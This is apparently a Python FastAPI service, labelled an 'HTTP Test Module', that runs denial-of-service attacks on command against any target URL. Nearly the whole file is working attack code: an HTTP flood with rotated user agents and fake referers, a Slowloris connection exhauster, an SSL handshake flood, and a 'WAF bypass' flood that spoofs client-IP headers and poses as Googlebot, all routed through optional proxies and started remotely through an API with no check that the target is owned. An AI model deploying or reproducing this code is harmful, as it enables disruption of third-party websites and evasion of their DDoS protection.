from fastapi import FastAPI, HTTPException, BackgroundTasks
from pydantic import BaseModel, validator
from typing import List, Dict, Optional, Set, Any, Union
import httpx
import logging
import asyncio
import time
import os
import random
import uuid
import ssl
import socket
from datetime import datetime
from enum import Enum
import threading
from urllib.parse import urlparse
import concurrent.futures

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("http-module")

# Initialize FastAPI
app = FastAPI(
    title="HTTP Test Module",
    description="Executes HTTP-based resilience tests",
    version="1.0.0"
)

# Global variables for test management
active_tests = {}
test_results = {}
test_stop_events = {}

# Default User-Agents
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# Default Referers
DEFAULT_REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
]


# Models
class ProxyType(int, Enum):
    HTTP = 1
    SOCKS4 = 4
    SOCKS5 = 5


class Proxy(BaseModel):
    host: str
    port: int
    type: ProxyType
    username: Optional[str] = None
    password: Optional[str] = None

    def as_url(self) -> str:
        auth = f"{self.username}:{self.password}@" if self.username and self.password else ""
        proto = "http" if self.type == ProxyType.HTTP else f"socks{self.type}"
        return f"{proto}://{auth}{self.host}:{self.port}"


class TestParameters(BaseModel):
    target: str
    method: str
    duration: int
    threads: int
    parameters: Optional[Dict[str, Any]] = None
    proxies: Optional[List[Proxy]] = None

    @validator('target')
    def validate_target(cls, v):
        if not v.startswith(('http://', 'https://')):
            return f"http://{v}"
        return v


# Counter class for tracking statistics
class AtomicCounter:
    def __init__(self):
        self._value = 0
        self._lock = threading.Lock()

    def increment(self, amount=1):
        with self._lock:
            self._value += amount
            return self._value

    def value(self):
        with self._lock:
            return self._value

    def reset(self):
        with self._lock:
            self._value = 0


# Test metrics
class TestMetrics:
    def __init__(self):
        self.requests_sent = AtomicCounter()
        self.bytes_sent = AtomicCounter()
        self.successful_requests = AtomicCounter()
        self.failed_requests = AtomicCounter()
        self.start_time = time.time()
        self.end_time = None

    def to_dict(self):
        return {
            "requests_sent": self.requests_sent.value(),
            "bytes_sent": self.bytes_sent.value(),
            "successful_requests": self.successful_requests.value(),
            "failed_requests": self.failed_requests.value(),
            "duration": (self.end_time or time.time()) - self.start_time,
            "requests_per_second": self.requests_sent.value() / ((self.end_time or time.time()) - self.start_time),
            "success_rate": (self.successful_requests.value() / max(1, self.requests_sent.value())) * 100
        }


# Test execution methods
async def execute_http_flood(test_id, params, stop_event, metrics):
    """
    Execute an HTTP flood test
    """
    target = params.target
    duration = params.duration
    threads = params.threads
    proxies = params.proxies
    rpc = params.parameters.get("rpc", 1) if params.parameters else 1

    # Parse URL components
    parsed_url = urlparse(target)
    host = parsed_url.netloc
    path = parsed_url.path if parsed_url.path else "/"
    scheme = parsed_url.scheme
    is_ssl = scheme == "https"

    # Setup test metrics
    test_metrics = metrics

    # Start time
    start_time = time.time()
    end_time = start_time + duration

    # Create workers
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(threads):
            if stop_event.is_set():
                break

            proxy = random.choice(proxies) if proxies else None
            futures.append(
                executor.submit(
                    http_flood_worker,
                    target, host, is_ssl, rpc, end_time, test_metrics, stop_event, proxy
                )
            )

        # Wait for all workers to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"Error in worker: {e}")

    # Update end time
    test_metrics.end_time = time.time()

    # Return results
    return {
        "test_id": test_id,
        "target": target,
        "duration": test_metrics.end_time - test_metrics.start_time,
        "metrics": test_metrics.to_dict()
    }


def http_flood_worker(target, host, is_ssl, rpc, end_time, metrics, stop_event, proxy=None):
    """
    Worker function for HTTP flood
    """
    headers = {
        "User-Agent": random.choice(DEFAULT_USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Referer": random.choice(DEFAULT_REFERERS) + target
    }

    # Setup session with proxy if provided
    session = httpx.Client(
        proxies=proxy.as_url() if proxy else None,
        verify=False,  # Skip SSL verification for performance
        timeout=15.0  # Reasonable timeout
    )

    try:
        while time.time() < end_time and not stop_event.is_set():
            try:
                # Send requests
                for _ in range(rpc):
                    if time.time() >= end_time or stop_event.is_set():
                        break

                    # Add some randomness to the headers
                    headers["User-Agent"] = random.choice(DEFAULT_USER_AGENTS)
                    headers["Referer"] = random.choice(DEFAULT_REFERERS) + target

                    # Send request
                    response = session.get(target, headers=headers)

                    # Update metrics
                    metrics.requests_sent.increment()
                    metrics.bytes_sent.increment(len(str(headers)) + 100)  # Approximate request size

                    if response.status_code < 500:
                        metrics.successful_requests.increment()
                    else:
                        metrics.failed_requests.increment()

            except Exception as e:
                metrics.failed_requests.increment()
                time.sleep(0.1)  # Small delay on error

    finally:
        session.close()


async def execute_slow_loris(test_id, params, stop_event, metrics):
    """
    Execute a Slow Loris test - opens many connections and sends partial headers very slowly
    """
    target = params.target
    duration = params.duration
    threads = params.threads
    proxies = params.proxies

    # Parse URL components
    parsed_url = urlparse(target)
    host = parsed_url.netloc
    path = parsed_url.path if parsed_url.path else "/"
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    is_ssl = parsed_url.scheme == "https"

    # Setup test metrics
    test_metrics = metrics

    # Start time
    start_time = time.time()
    end_time = start_time + duration

    # Create workers
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(threads):
            if stop_event.is_set():
                break

            proxy = random.choice(proxies) if proxies else None
            futures.append(
                executor.submit(
                    slow_loris_worker,
                    host, port, path, is_ssl, end_time, test_metrics, stop_event, proxy
                )
            )

        # Wait for all workers to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"Error in worker: {e}")

    # Update end time
    test_metrics.end_time = time.time()

    # Return results
    return {
        "test_id": test_id,
        "target": target,
        "duration": test_metrics.end_time - test_metrics.start_time,
        "metrics": test_metrics.to_dict()
    }


def slow_loris_worker(host, port, path, is_ssl, end_time, metrics, stop_event, proxy=None):
    """
    Worker function for Slow Loris
    """
    sockets = []
    socket_count = 0
    max_sockets = 150  # Maximum connections per worker

    try:
        while time.time() < end_time and not stop_event.is_set() and socket_count < max_sockets:
            try:
                # Create socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)

                # Connect to target
                if proxy:
                    # This is simplified - in a real implementation,
                    # you'd need to implement SOCKS/HTTP proxy connections
                    s.connect((proxy.host, proxy.port))
                else:
                    s.connect((host, port))

                # Wrap with SSL if needed
                if is_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=host)

                # Send partial HTTP request
                s.send(f"GET {path} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send(
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n".encode())

                # Keep socket open
                sockets.append(s)
                socket_count += 1
                metrics.requests_sent.increment()
                metrics.successful_requests.increment()

                # Throttle connection creation
                time.sleep(0.1)

            except Exception as e:
                metrics.failed_requests.increment()
                time.sleep(0.5)  # Longer delay on error

        # Keep connections alive by sending headers periodically
        while time.time() < end_time and not stop_event.is_set():
            for i, s in enumerate(list(sockets)):
                try:
                    # Send a partial header to keep connection alive
                    s.send(f"X-a: {i}\r\n".encode())
                    metrics.bytes_sent.increment(10)
                except:
                    # Socket error, remove from list
                    sockets.remove(s)
                    s.close()
                    metrics.failed_requests.increment()

            # Send incomplete headers every few seconds
            time.sleep(15)

    finally:
        # Clean up any remaining sockets
        for s in sockets:
            try:
                s.close()
            except:
                pass


async def execute_ssl_flood(test_id, params, stop_event, metrics):
    """
    Execute an SSL flood test - focuses on SSL/TLS handshakes
    """
    target = params.target
    duration = params.duration
    threads = params.threads
    proxies = params.proxies

    # Parse URL components
    parsed_url = urlparse(target)
    host = parsed_url.netloc
    port = parsed_url.port or 443
    is_ssl = True  # Force SSL for this test

    # Update target to use HTTPS
    if not target.startswith('https://'):
        target = target.replace('http://', 'https://')

    # Setup test metrics
    test_metrics = metrics

    # Start time
    start_time = time.time()
    end_time = start_time + duration

    # Create workers
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(threads):
            if stop_event.is_set():
                break

            proxy = random.choice(proxies) if proxies else None
            futures.append(
                executor.submit(
                    ssl_flood_worker,
                    host, port, end_time, test_metrics, stop_event, proxy
                )
            )

        # Wait for all workers to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"Error in worker: {e}")

    # Update end time
    test_metrics.end_time = time.time()

    # Return results
    return {
        "test_id": test_id,
        "target": target,
        "duration": test_metrics.end_time - test_metrics.start_time,
        "metrics": test_metrics.to_dict()
    }


def ssl_flood_worker(host, port, end_time, metrics, stop_event, proxy=None):
    """
    Worker function for SSL flood
    """
    while time.time() < end_time and not stop_event.is_set():
        s = None
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)

            # Connect to target
            if proxy:
                # This is simplified - in a real implementation,
                # you'd need to implement SOCKS/HTTP proxy connections
                s.connect((proxy.host, proxy.port))
            else:
                s.connect((host, port))

            # Create SSL context
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            # Perform SSL handshake
            s = context.wrap_socket(s, server_hostname=host)

            # Update metrics
            metrics.requests_sent.increment()
            metrics.successful_requests.increment()
            metrics.bytes_sent.increment(100)  # Approximate SSL handshake size

        except Exception as e:
            metrics.failed_requests.increment()
        finally:
            # Close socket
            if s:
                try:
                    s.close()
                except:
                    pass
            time.sleep(0.1)  # Small delay between connections


async def execute_http_bypass(test_id, params, stop_event, metrics):
    """
    Execute an HTTP bypass test - tries to bypass WAF/DDoS protection
    """
    target = params.target
    duration = params.duration
    threads = params.threads
    proxies = params.proxies

    # Setup test metrics
    test_metrics = metrics

    # Parse URL components
    parsed_url = urlparse(target)
    host = parsed_url.netloc

    # Start time
    start_time = time.time()
    end_time = start_time + duration

    # Advanced headers for WAF bypass
    waf_bypass_headers = [
        {
            "User-Agent": random.choice(DEFAULT_USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "X-Forwarded-Host": host,
            "X-Forwarded-Proto": "http",
            "X-Client-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "X-Remote-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "X-Remote-Addr": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "Referer": random.choice(DEFAULT_REFERERS) + target
        },
        {
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "From": "googlebot(at)googlebot.com",
            "Host": host
        },
        {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }
    ]

    # Create workers
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(threads):
            if stop_event.is_set():
                break

            proxy = random.choice(proxies) if proxies else None
            futures.append(
                executor.submit(
                    http_bypass_worker,
                    target, waf_bypass_headers, end_time, test_metrics, stop_event, proxy
                )
            )

        # Wait for all workers to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"Error in worker: {e}")

    # Update end time
    test_metrics.end_time = time.time()

    # Return results
    return {
        "test_id": test_id,
        "target": target,
        "duration": test_metrics.end_time - test_metrics.start_time,
        "metrics": test_metrics.to_dict()
    }


def http_bypass_worker(target, header_sets, end_time, metrics, stop_event, proxy=None):
    """
    Worker function for HTTP bypass
    """
    session = httpx.Client(
        proxies=proxy.as_url() if proxy else None,
        verify=False,
        timeout=15.0
    )

    try:
        while time.time() < end_time and not stop_event.is_set():
            # Pick a random header set
            headers = random.choice(header_sets).copy()

            # Randomize IP values
            for key in ['X-Forwarded-For', 'X-Client-IP', 'X-Remote-IP', 'X-Remote-Addr', 'X-Real-IP']:
                if key in headers:
                    headers[
                        key] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

            try:
                # Randomize user agent
                headers["User-Agent"] = random.choice(DEFAULT_USER_AGENTS)

                # Send request
                response = session.get(target, headers=headers)

                # Update metrics
                metrics.requests_sent.increment()
                metrics.bytes_sent.increment(len(str(headers)) + 100)  # Approximate request size

                if response.status_code < 500:
                    metrics.successful_requests.increment()
                else:
                    metrics.failed_requests.increment()

                # Small delay between requests
                time.sleep(0.1)

            except Exception as e:
                metrics.failed_requests.increment()
                time.sleep(0.5)  # Longer delay on error

    finally:
        session.close()


# Method mapping
TEST_METHODS = {
    "HTTP_FLOOD": execute_http_flood,
    "SLOW_LORIS": execute_slow_loris,
    "SSL_FLOOD": execute_ssl_flood,
    "HTTP_BYPASS": execute_http_bypass
}


# Routes
@app.post("/execute")
async def execute_test(test_params: TestParameters, background_tasks: BackgroundTasks):
    """
    Execute a test with the specified parameters
    """
    # Generate test ID
    test_id = str(uuid.uuid4())

    # Check if method is supported
    if test_params.method not in TEST_METHODS:
        raise HTTPException(
            status_code=400,
            detail=f"Unsupported method: {test_params.method}. Available methods: {', '.join(TEST_METHODS.keys())}"
        )

    # Create stop event
    stop_event = threading.Event()
    test_stop_events[test_id] = stop_event

    # Initialize metrics
    metrics = TestMetrics()

    # Store test
    active_tests[test_id] = {
        "id": test_id,
        "params": test_params,
        "start_time": time.time(),
        "status": "running"
    }

    # Execute test in background
    background_tasks.add_task(
        run_test,
        test_id,
        test_params,
        stop_event,
        metrics
    )

    return {"test_id": test_id, "status": "started"}


async def run_test(test_id, params, stop_event, metrics):
    """
    Run a test asynchronously
    """
    try:
        # Select test method
        test_method = TEST_METHODS[params.method]

        # Execute test
        result = await test_method(test_id, params, stop_event, metrics)

        # Store results
        test_results[test_id] = result
        active_tests[test_id]["status"] = "completed"
        active_tests[test_id]["end_time"] = time.time()

    except Exception as e:
        logger.error(f"Error executing test {test_id}: {e}")
        active_tests[test_id]["status"] = "failed"
        active_tests[test_id]["error"] = str(e)
        test_results[test_id] = {"error": str(e)}

    finally:
        # Clean up
        if test_id in test_stop_events:
            del test_stop_events[test_id]


@app.delete("/execute/{test_id}")
async def stop_test(test_id: str):
    """
    Stop a running test
    """
    if test_id not in active_tests:
        raise HTTPException(status_code=404, detail="Test not found")

    if active_tests[test_id]["status"] != "running":
        raise HTTPException(status_code=400, detail="Test is not running")

    # Set stop event
    if test_id in test_stop_events:
        test_stop_events[test_id].set()

    # Update test status
    active_tests[test_id]["status"] = "stopped"
    active_tests[test_id]["end_time"] = time.time()

    return {"test_id": test_id, "status": "stopped"}


@app.get("/status/{test_id}")
async def get_test_status(test_id: str):
    """
    Get status of a test
    """
    if test_id not in active_tests:
        raise HTTPException(status_code=404, detail="Test not found")

    test = active_tests[test_id]

    response = {
        "test_id": test_id,
        "status": test["status"],
        "start_time": test["start_time"]
    }

    if "end_time" in test:
        response["end_time"] = test["end_time"]
        response["duration"] = test["end_time"] - test["start_time"]

    if test["status"] in ["completed", "failed"]:
        response["results"] = test_results.get(test_id, {})

    return response


@app.get("/health")
async def health_check():
    """
    Health check endpoint
    """
    return {"status": "healthy"}


if __name__ == "__main__":
    import uvicorn

    uvicorn.run("main:app", host="0.0.0.0", port=8001, reload=True)